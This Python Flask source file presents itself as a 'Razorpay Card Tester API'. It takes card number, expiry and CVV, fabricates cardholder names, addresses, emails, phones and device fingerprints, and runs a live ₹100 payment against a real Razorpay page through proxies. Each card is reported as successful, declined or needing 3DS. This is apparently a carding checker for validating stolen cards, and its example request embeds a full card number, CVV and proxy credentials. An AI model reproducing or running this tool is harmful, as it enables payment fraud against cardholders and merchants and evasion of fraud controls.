# app.py - With address generation and filling
from flask import Flask, request, jsonify
import requests, re, json, time, random, string, secrets, hashlib, base64, urllib3
from urllib.parse import quote
import os

urllib3.disable_warnings()

app = Flask(__name__)

# ========== CONFIGURATION ==========
URL = "https://pages.razorpay.com/iicdelhi"
AMO = 10000  # ₹100.00 in paise

# ========== ADDRESS DATA ==========
INDIAN_CITIES = [
    "Mumbai", "Delhi", "Bangalore", "Hyderabad", "Ahmedabad", 
    "Chennai", "Kolkata", "Surat", "Pune", "Jaipur", 
    "Lucknow", "Kanpur", "Nagpur", "Indore", "Thane",
    "Bhopal", "Visakhapatnam", "Patna", "Vadodara", "Ludhiana"
]

INDIAN_STATES = {
    "MH": "Maharashtra", "DL": "Delhi", "KA": "Karnataka", "TG": "Telangana",
    "GJ": "Gujarat", "TN": "Tamil Nadu", "WB": "West Bengal", "RJ": "Rajasthan",
    "UP": "Uttar Pradesh", "MP": "Madhya Pradesh", "BR": "Bihar", "PB": "Punjab"
}

INDIAN_PINCODES = [
    "400001", "110001", "560001", "500001", "380001", 
    "600001", "700001", "395001", "411001", "302001",
    "226001", "208001", "440001", "452001", "400601",
    "462001", "530001", "800001", "390001", "141001"
]

INDIAN_NAMES = [
    "Raj Sharma", "Priya Patel", "Amit Kumar", "Sneha Reddy", "Vikram Singh",
    "Ananya Mehta", "Arjun Joshi", "Kavya Gupta", "Rohan Malhotra", "Ishita Verma",
    "Manish Yadav", "Neha Agarwal", "Suresh Nair", "Deepika Rao", "Rahul Khanna"
]

def generate_address():
    """Generate random Indian address"""
    city = random.choice(INDIAN_CITIES)
    state_code = random.choice(list(INDIAN_STATES.keys()))
    state = INDIAN_STATES[state_code]
    pincode = random.choice(INDIAN_PINCODES)
    
    # Generate street address
    street_types = ["Street", "Road", "Lane", "Avenue", "Boulevard", "Colony", "Nagar", "Vihar"]
    street_names = ["MG", "Park", "Lake", "Hill", "Garden", "Sunset", "Green", "Rose", "Lotus", "Golden"]
    house_numbers = [str(random.randint(1, 999)) + random.choice(["A", "B", "C", ""]) for _ in range(1)]
    
    address_line1 = f"{random.choice(house_numbers)}, {random.choice(street_names)} {random.choice(street_types)}"
    address_line2 = f"{random.choice(['Near', 'Opposite'])} {random.choice(['Park', 'Mall', 'Temple', 'School', 'Hospital'])}"
    
    return {
        "address_line1": address_line1,
        "address_line2": address_line2,
        "city": city,
        "state": state,
        "state_code": state_code,
        "pincode": pincode,
        "country": "IN"
    }

def generate_cardholder_name():
    return random.choice(INDIAN_NAMES)

def get_card_brand(card_number):
    if card_number.startswith("4"): return "visa"
    elif card_number[:2] in ("51", "52", "53", "54", "55"): return "mastercard"
    elif card_number[:2] in ("34", "37"): return "amex"
    elif card_number.startswith("6011") or card_number.startswith("65"): return "discover"
    elif card_number.startswith("35"): return "jcb"
    elif card_number.startswith("62"): return "unionpay"
    else: return "unknown"

def find_between(content, start, end):
    try:
        s = content.index(start) + len(start)
        e = content.index(end, s)
        return content[s:e]
    except ValueError:
        return ""

def parse_proxy(proxy_string):
    if not proxy_string:
        return None
    parts = proxy_string.split(':')
    if len(parts) == 4:
        return {"http": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}", 
                "https": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"}
    elif len(parts) == 2:
        return {"http": f"http://{parts[0]}:{parts[1]}", 
                "https": f"http://{parts[0]}:{parts[1]}"}
    return None

def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
    result = {
        "status": "error",
        "message": "Unknown error",
        "raw_json": None,
        "card": f"{cc[:6]}******{cc[-4:]}",
        "redirect_url": None,
        "address_used": None
    }
    
    try:
        # Generate address and cardholder name
        address = generate_address()
        cardholder_name = generate_cardholder_name()
        
        result["address_used"] = {
            "name": cardholder_name,
            "address": address
        }
        
        print(f"📍 Address generated: {cardholder_name}, {address['address_line1']}, {address['city']}")
        
        # Generate other data
        MEMBERSHIP_ID = f"MEM{random.randint(10000, 99999)}"
        EMAIL = generate_email()
        PHONE = generate_phone()
        
        brand = get_card_brand(cc)
        year_full = int("20" + yy)
        
        session = requests.Session()
        session.verify = False
        if proxy_string:
            proxy_dict = parse_proxy(proxy_string)
            if proxy_dict:
                session.proxies = proxy_dict
        
        h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
        ts = str(int(time.time() * 1000))
        rnd = str(random.randrange(10**8)).zfill(8)
        rzp_device_id = f"1.{h}.{ts}.{rnd}"
        BASE62 = string.ascii_letters + string.digits
        rzp_unified_session_id = ''.join(secrets.choice(BASE62) for _ in range(14))
        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'
        BUILD = "9cb57fdf457e44eac4384e182f925070ff5488d9"
        BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
        
        # STEP 1: Get payment page and extract keys
        resp_init = session.get(URL, timeout=30)
        json_text = re.search(r'var data = ({.*?});', resp_init.text, re.DOTALL)
        if not json_text:
            result["message"] = "Failed to extract page data"
            return result
        
        init_data = json.loads(json_text.group(1))
        kyid = init_data["key_id"]
        plink = init_data["payment_link"]["id"]
        ppid = init_data["payment_link"]["payment_page_items"][0]["id"]
        keyless_header = init_data.get("keyless_header")
        keyless_header_url = quote(keyless_header.encode('utf-8'), safe='')
        
        # STEP 2: Create order
        headers_order = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://pages.razorpay.com',
            'Referer': 'https://pages.razorpay.com/',
            'User-Agent': ua,
        }
        
        json_order = {
            'line_items': [{'payment_page_item_id': ppid, 'amount': AMO}],
            'notes': {
                'membership_id': MEMBERSHIP_ID,
                'member_name': cardholder_name,
                'email': EMAIL,
                'contact_number': PHONE,
                'address': f"{address['address_line1']}, {address['address_line2']}, {address['city']}, {address['state']} - {address['pincode']}"
            },
        }
        
        resp_order = session.post(
            f"https://api.razorpay.com/v1/payment_pages/{plink}/order", 
            headers=headers_order, 
            json=json_order, 
            timeout=30
        )
        
        if resp_order.status_code != 200:
            result["message"] = f"Order creation failed: {resp_order.status_code}"
            result["raw_json"] = {"order_error": resp_order.text}
            return result
            
        order_data = json.loads(resp_order.text)
        order_id = order_data["order"]["id"]
        checkout_id = order_id.split("_")[1]
        
        # STEP 3: Get session token
        params_public = {
            'traffic_env': 'production', 'build': BUILD, 'build_v1': BUILD_V1,
            'checkout_v2': '1', 'new_session': '1', 'keyless_header': keyless_header,
            'rzp_device_id': rzp_device_id, 'unified_session_id': rzp_unified_session_id,
        }
        resp_public = session.get(
            'https://api.razorpay.com/v1/checkout/public', 
            params=params_public, 
            headers={'User-Agent': ua}, 
            timeout=30
        )
        
        sessid = find_between(resp_public.text, 'window.session_token="', '";')
        if not sessid:
            m = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', resp_public.text)
            if m: 
                sessid = m.group(1)
        
        if not sessid:
            result["message"] = "Failed to get session token"
            return result
        
        # STEP 4: Checkout order state
        headers_co = {
            'Accept': '*/*', 
            'Content-type': 'application/x-www-form-urlencoded',
            'Origin': 'https://api.razorpay.com',
            'Referer': resp_public.url,
            'User-Agent': ua, 
            'x-session-token': sessid,
        }
        params_co = {'key_id': kyid, 'session_token': sessid, 'keyless_header': keyless_header}
        data_co = {
            'notes[email]': EMAIL, 
            'notes[phone]': PHONE[3:], 
            'payment_link_id': plink,
            'key_id': kyid, 
            'contact': PHONE, 
            'email': EMAIL, 
            'currency': 'INR',
            '_[integration]': 'payment_pages', 
            '_[device.id]': rzp_device_id,
            '_[library]': 'checkoutjs', 
            '_[library_src]': 'no-src', 
            '_[current_script_src]': 'no-src',
            '_[platform]': 'browser', 
            '_[env]': '', 
            '_[is_magic_script]': 'false', 
            '_[os]': 'windows',
            '_[shield][fhash]': h, 
            '_[shield][tz]': '0', 
            '_[device_id]': rzp_device_id,
            '_[build]': BUILD, 
            '_[shield][os]': 'windows', 
            '_[shield][platform]': 'browser',
            '_[shield][browser]': 'chrome', 
            '_[request_index]': '0', 
            'amount': AMO,
            'order_id': order_id, 
            'method': 'card', 
            'checkout_id': checkout_id,
        }
        session.post(
            'https://api.razorpay.com/v1/standard_checkout/checkout/order', 
            params=params_co, 
            headers=headers_co, 
            data=data_co, 
            timeout=30
        )
        
        # STEP 5: Cross border flows
        headers_cb = {
            "Accept": "*/*", 
            "Content-type": "application/json", 
            "User-Agent": ua, 
            "x-session-token": sessid, 
            "Origin": "https://api.razorpay.com",
            "Referer": resp_public.url,
        }
        payload_cb = {
            "identifiers": {
                "merchant": {"country": "IN"}, 
                "card": {"country": "US", "dcc_blacklist": False, "network": brand}, 
                "method": "card", 
                "payment_currency": "INR"
            },
            "forex_charges": {"amount": AMO, "currency": "INR", "filters": {"method": "card"}}
        }
        session.post(
            f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id={order_id}&keyless_header={keyless_header_url}", 
            headers=headers_cb, 
            json=payload_cb, 
            timeout=30
        )
        
        # STEP 6: Create payment - WITH ADDRESS FIELDS
        headers_create = {
            'Accept': '*/*', 
            'Content-type': 'application/x-www-form-urlencoded', 
            'Origin': 'https://api.razorpay.com',
            'Referer': resp_public.url,
            'User-Agent': ua, 
            'x-session-token': sessid,
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
        }
        params_create = {'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless_header}
        token_create = base64.b64encode(
            json.dumps([{"name": "sardine", "metadata": {"session_id": checkout_id}}], 
            separators=(',', ':')).encode()
        ).decode()
        
        data_create = {
            "user_risk_providers_token": token_create, 
            'notes[comment]': '', 
            'notes[email]': EMAIL,
            'notes[phone]': PHONE[3:], 
            'notes[name]': cardholder_name,
            'payment_link_id': plink, 
            'key_id': kyid,
            'contact': PHONE, 
            'email': EMAIL, 
            'currency': 'INR',
            '_[integration]': 'payment_pages',
            '_[checkout_id]': checkout_id, 
            '_[device.id]': rzp_device_id, 
            '_[env]': '', 
            '_[library]': 'checkoutjs',
            '_[library_src]': 'no-src', 
            '_[current_script_src]': 'no-src', 
            '_[is_magic_script]': 'false',
            '_[platform]': 'browser', 
            '_[referer]': URL, 
            '_[shield][fhash]': h, 
            '_[shield][tz]': '-330',
            '_[device_id]': rzp_device_id, 
            '_[build]': BUILD, 
            '_[shield][os]': 'windows',
            '_[shield][platform]': 'browser', 
            '_[shield][browser]': 'chrome', 
            '_[request_index]': '1',
            'amount': AMO,
            'order_id': order_id, 
            'method': 'card', 
            'card[number]': cc,
            'card[cvv]': cvv, 
            'card[name]': cardholder_name,
            'card[expiry_month]': mm, 
            'card[expiry_year]': year_full,
            'card[address_line1]': address['address_line1'],
            'card[address_line2]': address['address_line2'],
            'card[address_city]': address['city'],
            'card[address_state]': address['state'],
            'card[address_zip]': address['pincode'],
            'card[address_country]': address['country'],
            'save': '0',
        }
        
        print(f"💳 Sending address: {address['address_line1']}, {address['city']}, {address['state']} - {address['pincode']}")
        
        resp_create = session.post(
            'https://api.razorpay.com/v1/standard_checkout/payments/create/checkout',
            params=params_create, 
            headers=headers_create, 
            data=data_create, 
            allow_redirects=False,
            timeout=30
        )
        
        # STEP 7: Parse response
        result["raw_json"] = {}
        
        # Check if it's HTML
        if 'text/html' in resp_create.headers.get('Content-Type', ''):
            # Extract error from HTML
            error_match = re.search(r'var data = ({.*?});', resp_create.text, re.DOTALL)
            if error_match:
                try:
                    error_data = json.loads(error_match.group(1))
                    if error_data.get('error'):
                        result["status"] = "declined"
                        result["message"] = f"Payment declined: {error_data['error'].get('description', 'Unknown error')}"
                        result["raw_json"] = error_data
                        return result
                except:
                    pass
            
            # Check for "Proceed" button or redirect
            if 'proceed-btn' in resp_create.text or 'Click here to proceed' in resp_create.text:
                result["status"] = "3ds_required"
                result["message"] = "3DS authentication required - click the link to proceed"
                result["raw_json"] = {"redirect": True, "message": "3DS OTP required"}
                return result
            
            result["status"] = "unknown"
            result["message"] = "HTML response received"
            result["raw_json"] = {"html_preview": resp_create.text[:500]}
            return result
        
        # Check if it's JSON
        try:
            pay_json = json.loads(resp_create.text)
            result["raw_json"] = pay_json
            
            payment_id = pay_json.get("payment_id") or pay_json.get("id")
            status = pay_json.get("status", "unknown")
            error_desc = pay_json.get("error_description", "")
            error_code = pay_json.get("error_code", "")
            
            if payment_id and status in ["authorized", "captured", "success"]:
                result["status"] = "success"
                result["message"] = "Payment successful"
                result["raw_json"]["payment_id"] = payment_id
                return result
            
            if error_desc or error_code:
                result["status"] = "declined"
                result["message"] = f"Payment declined: {error_desc if error_desc else error_code}"
                if pay_json.get("metadata", {}).get("order_id"):
                    result["raw_json"]["metadata"] = pay_json.get("metadata")
                return result
            
            if pay_json.get("redirect") is True or pay_json.get("type") == "redirect":
                result["status"] = "3ds_required"
                result["message"] = "3DS authentication required"
                return result
            
            result["status"] = "unknown"
            result["message"] = "Unknown response from gateway"
            
        except json.JSONDecodeError:
            result["status"] = "unknown"
            result["message"] = "Non-JSON response received"
            result["raw_json"] = {"raw_response": resp_create.text[:500]}
        
        return result
        
    except Exception as e:
        result["status"] = "error"
        result["message"] = f"Exception: {str(e)}"
        result["raw_json"] = {"error": str(e)}
        return result

def generate_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com", "icloud.com"]
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{username}@{random.choice(domains)}"

def generate_phone():
    return f"+91{random.randint(7000000000, 9999999999)}"

# ========== FLASK API ENDPOINTS ==========
@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "service": "Razorpay Card Tester API",
        "version": "1.8",
        "endpoints": {
            "test": "/test?cc=xxxx|mm|yy|cvv&site=url&proxy=host:port:user:pass"
        },
        "example": "/test?cc=4342562526966146|08|2029|292&site=https://razorpay.me/@tpstech&proxy=jp-tok.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
        "status": "operational"
    })

@app.route('/test', methods=['GET'])
def test_endpoint():
    cc_param = request.args.get('cc')
    site_param = request.args.get('site')
    proxy_param = request.args.get('proxy')
    
    if not cc_param:
        return jsonify({
            "status": "error",
            "message": "Missing cc parameter. Format: cc=xxxx|mm|yy|cvv",
            "example": "cc=4342562526966146|08|2029|292"
        }), 400
    
    try:
        parts = cc_param.split('|')
        if len(parts) != 4:
            return jsonify({
                "status": "error",
                "message": "Invalid cc format. Use: xxxx|mm|yy|cvv"
            }), 400
        
        cc = parts[0].strip()
        mm = parts[1].strip().zfill(2)
        yy = parts[2].strip()[-2:]
        cvv = parts[3].strip()
        
        if not cc.isdigit() or len(cc) < 12:
            return jsonify({"status": "error", "message": "Invalid card number"}), 400
        if not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
            return jsonify({"status": "error", "message": "Invalid month"}), 400
        if not yy.isdigit() or len(yy) != 2:
            return jsonify({"status": "error", "message": "Invalid year (use 2 digits)"}), 400
        if not cvv.isdigit() or len(cvv) < 3:
            return jsonify({"status": "error", "message": "Invalid CVV"}), 400
            
    except Exception as e:
        return jsonify({"status": "error", "message": f"Failed to parse card: {str(e)}"}), 400
    
    print(f"📥 Request received:")
    print(f"   Card: {cc[:6]}******{cc[-4:]}")
    print(f"   Site: {site_param}")
    print(f"   Proxy: {proxy_param[:30] if proxy_param else 'None'}...")
    
    result = test_card_on_razorpay(cc, mm, yy, cvv, proxy_param)
    
    if site_param:
        result["site"] = site_param
        if result.get("raw_json") and isinstance(result["raw_json"], dict):
            result["raw_json"]["site"] = site_param
    
    return jsonify(result)

@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        "status": "healthy",
        "timestamp": time.time()
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
